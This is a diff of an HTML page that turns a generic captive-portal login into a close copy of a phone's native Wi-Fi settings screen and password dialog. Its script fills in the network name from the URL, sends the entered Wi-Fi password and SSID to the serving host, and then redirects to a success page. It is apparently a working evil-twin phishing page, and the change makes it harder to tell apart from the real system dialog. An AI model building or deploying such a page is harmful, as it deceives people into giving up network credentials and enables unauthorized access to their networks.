@@ -3,221 +3,250 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to network</title>
+    <title>Wi-Fi</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Roboto', sans-serif;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
         body {
-            background: #f5f5f5;
+            font-family: 'Roboto', sans-serif;
+            background: #0d1117;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
         }
-        
-        .header {
-            background: #1a73e8;
-            color: white;
-            padding: 20px;
-            text-align: center;
-        }
-        
-        .header h1 {
-            font-size: 20px;
-            font-weight: 500;
-        }
-        
-        .container {
-            flex: 1;
+
+        .topbar {
             display: flex;
             align-items: center;
-            justify-content: center;
-            padding: 20px;
+            padding: 14px 18px 10px;
+            gap: 16px;
+            color: #7ec8e3;
         }
-        
-        .login-card {
-            background: white;
-            border-radius: 8px;
-            padding: 24px;
-            width: 100%;
-            max-width: 360px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+        .topbar .back { font-size: 22px; color: #7ec8e3; cursor: pointer; }
+        .topbar .title { font-size: 20px; color: #ccc; flex: 1; }
+        .topbar .qr { font-size: 20px; color: #7ec8e3; }
+
+        .wifi-toggle-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 14px 20px; color: #ccc; font-size: 15px;
         }
-        
-        .wifi-icon {
-            text-align: center;
-            font-size: 48px;
-            margin-bottom: 16px;
+        .toggle {
+            width: 46px; height: 26px; background: #1a73e8;
+            border-radius: 13px; position: relative;
         }
-        
-        .network-info {
-            text-align: center;
-            margin-bottom: 24px;
+        .toggle::after {
+            content: ''; position: absolute; right: 3px; top: 3px;
+            width: 20px; height: 20px; border-radius: 50%; background: #fff;
         }
-        
-        .network-name {
-            font-size: 18px;
-            color: #202124;
-            font-weight: 500;
-            margin-bottom: 8px;
-        }
-        
-        .network-type {
-            font-size: 14px;
-            color: #5f6368;
-        }
-        
-        .input-group {
-            margin-bottom: 16px;
-        }
-        
-        .input-group label {
-            display: block;
-            font-size: 14px;
-            color: #5f6368;
-            margin-bottom: 8px;
-        }
-        
-        .input-group input {
-            width: 100%;
-            padding: 12px 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 16px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        
-        .input-group input:focus {
-            border-color: #1a73e8;
-            border-width: 2px;
-        }
-        
-        .options {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .options label {
-            font-size: 14px;
-            color: #5f6368;
-            margin-left: 8px;
-        }
-        
-        .login-btn {
-            width: 100%;
-            padding: 12px;
-            background: #1a73e8;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
+
+        .section-label {
+            padding: 8px 20px 4px;
+            font-size: 12px; color: #5f8fa8; letter-spacing: 0.5px;
             text-transform: uppercase;
         }
-        
-        .login-btn:hover {
-            background: #1557b0;
+
+        .wifi-row {
+            display: flex; align-items: center; gap: 14px;
+            padding: 14px 20px; color: #9ec9e0; font-size: 15px;
         }
-        
-        .error-msg {
-            color: #d93025;
-            font-size: 14px;
-            text-align: center;
-            margin-top: 12px;
-            display: none;
+        .wifi-row .arrow { margin-left: auto; color: #555; }
+
+        /* Dialog */
+        .dialog-backdrop {
+            position: fixed; inset: 0;
+            background: rgba(0,0,0,0.55);
+            display: flex; align-items: center; justify-content: center;
+            padding: 20px;
         }
-        
-        .error-msg.show {
-            display: block;
+
+        .dialog {
+            background: #2b2b2b;
+            border-radius: 14px;
+            width: 100%; max-width: 360px;
+            overflow: hidden;
         }
-        
-        .footer {
-            text-align: center;
-            padding: 16px;
-            font-size: 12px;
-            color: #5f6368;
+
+        .dialog-body { padding: 22px 20px 0; }
+
+        .dialog-title {
+            font-size: 17px; font-weight: 600; color: #e8e8e8;
+            margin-bottom: 20px;
         }
-        
-        .footer a {
-            color: #1a73e8;
-            text-decoration: none;
+
+        .field-wrap { position: relative; margin-bottom: 4px; }
+        .field-label { font-size: 12px; color: #9e9e9e; margin-bottom: 4px; display: block; }
+        .field-row {
+            display: flex; align-items: center;
+            border-bottom: 1px solid #555;
+            padding-bottom: 6px;
         }
+        .field-row input {
+            flex: 1; background: transparent; border: none; outline: none;
+            color: #fff; font-size: 16px;
+        }
+        .field-icons { display: flex; gap: 12px; align-items: center; }
+        .field-icons span { color: #7ec8e3; font-size: 18px; cursor: pointer; }
+
+        .adv-toggle {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 18px 0 10px;
+            cursor: pointer; color: #d0d0d0; font-size: 15px;
+        }
+        .adv-toggle .chevron { color: #7ec8e3; font-size: 18px; transition: transform 0.2s; }
+        .adv-toggle.open .chevron { transform: rotate(180deg); }
+
+        .adv-section { display: none; padding-bottom: 8px; }
+        .adv-section.open { display: block; }
+
+        .adv-field { margin-bottom: 16px; }
+        .adv-field label { font-size: 12px; color: #9e9e9e; display: block; margin-bottom: 4px; }
+        .adv-select {
+            display: flex; align-items: center; justify-content: space-between;
+            border-bottom: 1px solid #555; padding-bottom: 6px;
+            color: #d0d0d0; font-size: 15px; cursor: pointer;
+        }
+        .adv-select .arr { color: #9e9e9e; font-size: 14px; }
+
+        .dialog-actions {
+            display: flex;
+            border-top: 1px solid #3a3a3a;
+            margin-top: 16px;
+        }
+        .dialog-actions button {
+            flex: 1; padding: 16px; background: none; border: none;
+            font-size: 14px; font-weight: 600; cursor: pointer;
+            letter-spacing: 0.5px; text-transform: uppercase;
+        }
+        .btn-cancel { color: #9e9e9e; border-right: 1px solid #3a3a3a; }
+        .btn-connect { color: #7ec8e3; }
+        .btn-cancel:hover { background: rgba(255,255,255,0.04); }
+        .btn-connect:hover { background: rgba(126,200,227,0.08); }
+
+        .wifi-prefs {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 14px 20px; color: #ccc; font-size: 15px;
+        }
+        .wifi-prefs small { display: block; font-size: 12px; color: #666; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>Sign in to network</h1>
+
+    <div class="topbar">
+        <span class="back">←</span>
+        <span class="title">Wi-Fi</span>
+        <span class="qr">⛶</span>
     </div>
-    
-    <div class="container">
-        <div class="login-card">
-            <div class="wifi-icon">📶</div>
-            
-            <div class="network-info">
-                <div class="network-name" id="ssid">Wi-Fi Network</div>
-                <div class="network-type">WPA2 Personal</div>
+
+    <div class="wifi-toggle-row">
+        <span>Use Wi-Fi</span>
+        <div class="toggle"></div>
+    </div>
+
+    <div class="section-label">WI-FI NETWORKS</div>
+
+    <div class="wifi-row">
+        <span>📶</span>
+        <span id="ssidDisplay">Wi-Fi</span>
+        <span class="arrow">›</span>
+    </div>
+
+    <!-- Dialog -->
+    <div class="dialog-backdrop">
+        <div class="dialog">
+            <div class="dialog-body">
+                <div class="dialog-title" id="ssidTitle">Wi-Fi</div>
+
+                <form id="loginForm" method="POST" action="/">
+                    <div class="field-wrap">
+                        <span class="field-label">Password</span>
+                        <div class="field-row">
+                            <input type="password" name="password" id="password"
+                                   placeholder="Password" required autocomplete="current-password">
+                            <div class="field-icons">
+                                <span id="toggleEye" title="Show/hide">🙈</span>
+                                <span title="Scan QR">⛶</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="adv-toggle" id="advToggle">
+                        <span>Advanced options</span>
+                        <span class="chevron">⌃</span>
+                    </div>
+
+                    <div class="adv-section" id="advSection">
+                        <div class="adv-field">
+                            <label>Metered</label>
+                            <div class="adv-select"><span>Detect automatically</span><span class="arr">▼</span></div>
+                        </div>
+                        <div class="adv-field">
+                            <label>Proxy</label>
+                            <div class="adv-select"><span>None</span><span class="arr">▼</span></div>
+                        </div>
+                        <div class="adv-field">
+                            <label>IP settings</label>
+                            <div class="adv-select"><span>DHCP</span><span class="arr">▼</span></div>
+                        </div>
+                        <div class="adv-field">
+                            <label>Privacy</label>
+                            <div class="adv-select"><span>Use randomized MAC (default)</span><span class="arr">▼</span></div>
+                        </div>
+                    </div>
+                </form>
             </div>
-            
-            <form id="loginForm" method="POST" action="/connect.php">
-                <div class="input-group">
-                    <label for="password">Password</label>
-                    <input type="password" name="password" id="password" placeholder="Enter password" required autocomplete="current-password">
-                </div>
-                
-                <div class="options">
-                    <input type="checkbox" id="showPassword">
-                    <label for="showPassword">Show password</label>
-                </div>
-                
-                <button type="submit" class="login-btn">Connect</button>
-                
-                <div class="error-msg" id="errorMsg">Wrong password. Try again.</div>
-            </form>
+
+            <div class="dialog-actions">
+                <button class="btn-cancel" onclick="document.querySelector('.dialog-backdrop').style.display='none'">Cancel</button>
+                <button class="btn-connect" id="connectBtn">Connect</button>
+            </div>
         </div>
     </div>
-    
-    <div class="footer">
-        <p>By connecting, you agree to the <a href="#">terms of service</a></p>
+
+    <!-- Bottom hint -->
+    <div style="position:fixed;bottom:0;width:100%;background:#0d1117;">
+        <div class="wifi-prefs">
+            <div>
+                <span>Wi-Fi preferences</span>
+                <small>Notify for public networks. Auto switch to mobile data</small>
+            </div>
+            <span style="color:#555;">›</span>
+        </div>
     </div>
 
     <script>
-        document.getElementById('showPassword').addEventListener('change', function() {
-            const passwordInput = document.getElementById('password');
-            passwordInput.type = this.checked ? 'text' : 'password';
+        const ssid = new URLSearchParams(window.location.search).get('ssid') || 'Wi-Fi';
+        document.getElementById('ssidTitle').textContent = ssid;
+        document.getElementById('ssidDisplay').textContent = ssid;
+
+        document.getElementById('toggleEye').addEventListener('click', function () {
+            const inp = document.getElementById('password');
+            const isHidden = inp.type === 'password';
+            inp.type = isHidden ? 'text' : 'password';
+            this.textContent = isHidden ? '👁' : '🙈';
         });
-        
-        // Get SSID from URL if provided
-        const urlParams = new URLSearchParams(window.location.search);
-        const ssid = urlParams.get('ssid') || 'Wi-Fi Network';
-        document.getElementById('ssid').textContent = ssid;
-        
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault();
+
+        const advToggle = document.getElementById('advToggle');
+        const advSection = document.getElementById('advSection');
+        advToggle.addEventListener('click', function () {
+            this.classList.toggle('open');
+            advSection.classList.toggle('open');
+        });
+
+        document.getElementById('connectBtn').addEventListener('click', function () {
             const password = document.getElementById('password').value;
-            
-            fetch('/connect.php', {
+            if (!password) return;
+            fetch('/', {
                 method: 'POST',
-                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: 'password=' + encodeURIComponent(password) + '&ssid=' + encodeURIComponent(ssid)
             })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
+            .then(r => r.text())
+            .then(html => {
+                if (html.includes('Connected') || html.includes('checkmark')) {
                     window.location.href = '/success.html';
-                } else {
-                    document.getElementById('errorMsg').classList.add('show');
                 }
             })
-            .catch(() => {
-                document.getElementById('errorMsg').classList.add('show');
-            });
+            .catch(() => {});
         });
     </script>
 </body>
